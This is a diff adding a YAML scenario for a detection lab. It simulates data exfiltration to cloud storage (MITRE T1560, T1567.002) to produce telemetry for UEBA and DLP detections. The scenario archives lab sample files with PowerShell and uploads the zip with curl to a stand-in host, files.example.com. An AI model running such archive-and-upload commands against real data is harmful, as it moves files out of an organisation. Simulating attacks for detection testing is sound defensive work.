@@ -1,0 +1,31 @@
+id: exfil_to_cloud_storage
+name: "Exfiltration to Cloud Storage (Benign Simulation)"
+version: "1.0"
+description: >
+  Simulates a benign user uploading non-sensitive sample data to common cloud storage
+  (e.g., OneDrive/Dropbox/Box) to generate telemetry for UEBA and DLP detections.
+safety:
+  isolated_lab_only: true
+  approvals: ["BlueTeamLead","DataProtectionOfficer"]
+telemetry_sources:
+  - SigninLogs
+  - OfficeActivity
+  - CloudAppEvents
+  - InformationProtectionLogs_CL
+sequence:
+  - step: Archive sample data
+    technique: T1560  # Archive Collected Data
+    commands:
+      - "powershell Compress-Archive -Path C:\\Lab\\samples\\*.txt -DestinationPath C:\\Lab\\samples\\bundle.zip -Force"
+  - step: Upload archive to cloud storage
+    technique: T1567.002  # Exfiltration to Cloud Storage
+    commands:
+      - "onedrive --upload C:\\Lab\\samples\\bundle.zip"   # placeholder CLI
+      - "curl -T C:\\Lab\\samples\\bundle.zip https://files.example.com/upload"  # benign endpoint
+detection_map:
+  - "../detections/exfil-abnormal-volume.kql"
+  - "../detections/exfiltration.spl"
+cleanup:
+  - "Remove-Item C:\\Lab\\samples\\bundle.zip -Force"
+notes:
+  - "Replace upload commands with your lab-safe targets."
